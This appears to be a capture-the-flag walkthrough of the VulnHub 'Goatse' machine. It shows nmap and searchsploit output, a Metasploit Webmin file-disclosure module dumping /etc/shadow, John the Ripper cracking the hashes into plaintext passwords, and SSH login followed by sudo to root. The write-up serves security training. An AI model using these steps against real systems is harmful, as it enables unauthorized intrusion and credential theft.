# Goatse Walkthrough - VulnHub

This is a step-by-step walkthrough of the "Goatse" VulnHub machine. The goal is to guide users through identifying vulnerabilities, exploiting them, and ultimately achieving root access. This write-up is intended for educational purposes only.



## Description

**Goatse** is a intermediate-level VulnHub machine designed to test a range of skills including reconnaissance, enumeration, exploitation, and privilege escalation. This walkthrough demonstrates the steps required to achieve root access.

---

## Requirements

- Virtualization software (e.g., VirtualBox, VMware)
- Kali Linux or another penetration testing OS
- Basic understanding of Linux commands
- Networking tools: `nmap`, `netcat`, `gobuster`, etc.

---

## Initial Setup

1. Download the Goatse VM from [VulnHub](https://www.vulnhub.com/).
2. Import the VM into your virtualization software.
3. Ensure the VM is on the same network as your attacking machine.
4. Boot the VM and note its IP address (use tools like `netdiscover` if necessary).


### Step 1: Reconnaissance

#### Identify the Target IP
Run the following command to discover the target's IP address:

### nmap 192.168.48.1/24 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-16 19:23 EST
Nmap scan report for 192.168.48.1
Host is up (0.00023s latency).
All 1000 scanned ports on 192.168.48.1 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:C0:00:08 (VMware)

Nmap scan report for 192.168.48.2
Host is up (0.00018s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE    SERVICE VERSION
53/tcp filtered domain
MAC Address: 00:50:56:E6:DB:DE (VMware)

Nmap scan report for 192.168.48.160
Host is up (0.0016s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp
22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)
25/tcp    open  smtp?
53/tcp    open  domain      ISC BIND 8.2.2-REL
80/tcp    open  http        Apache httpd 1.3.31 ((Unix))
587/tcp   open  submission?
631/tcp   open  ipp         CUPS 1.1
3306/tcp  open  mysql       MySQL (unauthorized)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
MAC Address: 00:0C:29:B5:B4:92 (VMware)

Nmap scan report for 192.168.48.254
Host is up (0.00022s latency).
All 1000 scanned ports on 192.168.48.254 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
MAC Address: 00:50:56:FE:AC:91 (VMware)

Nmap scan report for 192.168.48.165
Host is up (0.0000040s latency).
All 1000 scanned ports on 192.168.48.165 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (5 hosts up) scanned in 205.33 seconds
                                                                   

Check for open ports and services running on the target.

---

### Step 2: Enumeration

i find a vuln on a service named webmin by searchsploit

## searchsploit webmin     
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                     | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                    | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                            | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                   | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                         | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                             | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                  | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                        | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                  | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)               | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                             | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)              | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                   | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                     | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                          | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                    | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                | linux/webapps/50809.py
Webmin 1.996 - Remote Code Execution (RCE) (Authenticated)                          | linux/webapps/50998.py
Webmin 1.x - HTML Email Command Execution                                           | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                        | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                        | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                       | linux/webapps/47330.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                           

## let jumb to metasploit



### Step 3: Exploitation

#### Exploit Discovered Vulnerabilities

### msfconsole -q

msf6 > search webmin

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1   auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2   exploit/linux/http/webmin_file_manager_rce     2022-02-26       excellent  Yes    Webmin File Manager RCE
   3   exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   4     \_ target: Unix In-Memory                    .                .          .      .
   5     \_ target: Linux Dropper (x86 & x64)         .                .          .      .
   6     \_ target: Linux Dropper (ARM64)             .                .          .      .
   7   exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   8   exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   9   auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   10  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   11    \_ target: Automatic (Unix In-Memory)        .                .          .      .
   12    \_ target: Automatic (Linux Dropper)         .                .          .      .                            


Interact with a module by name or index. For example info 12, use 12 or use exploit/linux/http/webmin_backdoor
After interacting with a module you can manually set a TARGET with set TARGET 'Automatic (Linux Dropper)'

msf6 > use 1
msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.48.160
rhosts => 192.168.48.160
msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadow
rpath => /etc/shadow
msf6 auxiliary(admin/webmin/file_disclosure) > show options

Module options (auxiliary/admin/webmin/file_disclosure):

   Name     Current Setting   Required  Description
   ----     ---------------   --------  -----------
   DIR      /unauthenticated  yes       Webmin directory path
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.48.160    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                        sics/using-metasploit.html
   RPATH    /etc/shadow       yes       The file to download
   RPORT    10000             yes       The target port (TCP)
   SSL      false             no        Negotiate SSL/TLS for outgoing connections
   VHOST                      no        HTTP server virtual host


Auxiliary action:

   Name      Description
   ----      -----------
   Download  Download arbitrary file



View the full module info with the info, or info -d command.

msf6 auxiliary(admin/webmin/file_disclosure) > run
[*] Running module against 192.168.48.160
[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$1$k6V/lmUF$n2iBfemYg/IsVRyjqopr3.:14422:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
nobody:*:9797:0:::::
guest:$1$T7.0qXyH$hC4dje14rIUFJXbZUCkdB/:12876:0:99999:7:::
goatse:$1$lXWz2SF8$sr5ux2i3UpMAf30t5uMtT0:14422:0:99999:7:::
jpelman:$1$3nO0QVVF$Iy21QTWTrHPd5/6ZrAvrj.:14422:0:99999:7:::
jblow:$1$35A0vqVF$MoYgZm/DxNS5nBZZk3Y2R1:14422:0:99999:7:::
[*] Auxiliary module execution completed


### what just happen 
in a linux machines the /etc/passwd , /etc/shadow files it where the users and passwd are storred 
we use the webmin vuln in this module to execute a cat command to the path .

now lets crack this 4 hash 

## first create a file named hash.txt put it on desktop and copy the hashs and use john the ripper
                                                                                                        
┌──(root㉿kali)-[/home/kali/Desktop]
└─# ls       
Fatrat_Generated  ghost  GoatseLinux  hash.txt  Ransomware  rockyou.txt  shark  TheFatRat  VulnMachine
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Desktop]
└─# cat hash.txt 
guest:$1$T7.0qXyH$hC4dje14rIUFJXbZUCkdB/:12876:0:99999:7:::
goatse:$1$lXWz2SF8$sr5ux2i3UpMAf30t5uMtT0:14422:0:99999:7:::
jpelman:$1$3nO0QVVF$Iy21QTWTrHPd5/6ZrAvrj.:14422:0:99999:7:::
jblow:$1$35A0vqVF$MoYgZm/DxNS5nBZZk3Y2R1:14422:0:99999:7:::
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Desktop]
└─# john --wordlist='/home/kali/Desktop/rockyou.txt' hash.txt
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bobby            (jpelman)     
kokomo           (jblow)     
guest            (guest)     
gaping           (goatse)     
4g 0:00:00:10 DONE (2025-01-16 19:56) 0.3649g/s 162183p/s 174797c/s 174797C/s garfield666..gapeach12
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 











(root㉿kali)-[/home/kali/Desktop]
## ssh goatse@192.168.48.160
Unable to negotiate with 192.168.48.160 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Desktop]
## ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 goatse@192.168.48.160 
Unable to negotiate with 192.168.48.160 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
                                                                                                                      
┌──(root㉿kali)-[/home/kali/Desktop]
## ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa goatse@192.168.48.160 
Unable to negotiate with 192.168.48.160 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se

┌──(root㉿kali)-[/home/kali/Desktop]
## ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa goatse@192.168.48.160 -oCiphers=+aes128-cbc
The authenticity of host '192.168.48.160 (192.168.48.160)' can't be established.
RSA key fingerprint is SHA256:25uPigwKnzugpFkHd91FCdBukcikll8dkH4oV7OQROY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.48.160' (RSA) to the list of known hosts.
goatse@192.168.48.160's password:gaping
Linux 2.6.15.
goatse@slax:~$ pwd
/home/goatse
goatse@slax:~$ sudo su
Password:gaping
root@slax:/home/goatse# cd    
root@slax:~# pwd
/root
root@slax:~# 






## Conclusion

This walkthrough demonstrates the process of exploiting the Goatse VM to achieve root access. The steps include reconnaissance, enumeration, exploitation, and privilege escalation. Practice responsibly and ensure you understand the tools and techniques used.

---

**Disclaimer:** This write-up is for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.
